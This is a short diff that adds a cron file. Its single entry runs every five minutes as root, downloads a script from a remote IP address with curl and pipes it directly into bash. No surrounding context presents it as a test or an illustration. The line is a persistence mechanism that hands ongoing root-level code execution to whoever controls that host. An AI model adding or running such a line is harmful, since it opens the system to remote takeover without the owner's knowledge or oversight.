@@ -1,0 +1,2 @@
+*/5 * * * * root curl -fsSL http://198.51.100.20/cron.sh | bash
+
